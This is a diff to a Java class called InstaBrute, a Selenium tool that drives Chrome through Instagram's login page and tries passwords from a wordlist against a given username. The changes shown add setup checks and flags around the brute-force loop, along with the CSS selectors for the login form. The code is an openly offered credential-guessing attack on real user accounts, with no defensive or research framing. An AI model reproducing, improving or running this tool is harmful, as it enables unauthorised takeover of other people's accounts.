@@ -14,34 +14,45 @@ import java.net.URL;
 import java.time.Duration;
 
 public class InstaBrute {
-    private final String website = "https://www.instagram.com",
-            selectorUsername = "#loginForm > div > div:nth-child(1) > div > label > input",
-            selectorPassword = "#loginForm > div > div:nth-child(2) > div > label > input",
-            selectorLogin = "#loginForm > div > div:nth-child(3) > button",
-            errorBox = "#slfErrorAlert";
+    private final String website = "https://www.instagram.com";
+    private final String selectorPassword = "#loginForm > div > div:nth-child(2) > div > label > input",
+            selectorLogin = "#loginForm > div > div:nth-child(3) > button", errorBox = "#slfErrorAlert";
+    private final String username;
 
     private WebDriver driver;
-    private final String username;
     private File list;
+    private boolean allRight = false;
 
-    public InstaBrute(String username, String listPath) {
+    public InstaBrute(String username, String listPath, String chromeDriver) {
         this.username = username;
         // check if file list is working
         if (!isFileExists(listPath)) {
             System.out.println("[!] This file is not exists > [" + listPath + "]");
             return;
         }
-        // download chromedriver (download the same version number of your Chrome browser) and move it into this path C:\webdrivers\
-        System.setProperty("webdriver.chrome.driver", "C://webdrivers//chromedriver.exe");
+        // check if file of chrome driver is exists
+        File chromedriver = new File(chromeDriver);
+        if (chromedriver.isFile() && chromedriver.exists()) System.out.println("[+] Checking Chrome Driver Successfully Completed.");
+        else {
+            System.out.println("[-] Chrome Driver not found or path you entered wrong, Please check and try again.");
+            return;
+        }
+        // initialisation of chrome driver
+        System.setProperty("webdriver.chrome.driver", chromeDriver);
         driver = new ChromeDriver();
         System.out.println("[*] Trying to connect with the website...");
-        // check website
+        // check the network connection
         if (connect()) System.out.println("[+] Website is working");
-        else System.out.println("[!] Website not working, check you internet connection & please try again");
+        else {
+            System.out.println("[!] Website not working, check you internet connection & please try again");
+            return;
+        }
+        allRight = true;
     }
 
     public void startBruteForce() {
-        readWordList();
+        if (allRight) readWordList();
+        else System.out.println("[-] Something wrong, Please check and try again.");
     }
 
     private void readWordList() {
@@ -57,6 +68,7 @@ public class InstaBrute {
                 driver.get(website);
                 WebDriverWait wait = new WebDriverWait(driver, Duration.ofSeconds(10));
                 // initialize inputs
+                String selectorUsername = "#loginForm > div > div:nth-child(1) > div > label > input";
                 WebElement inputUsername = wait.until(ExpectedConditions.presenceOfElementLocated(By.cssSelector(selectorUsername)));
                 WebElement inputPass = wait.until(ExpectedConditions.presenceOfElementLocated(By.cssSelector(selectorPassword)));
                 // enter the info and click the button of login
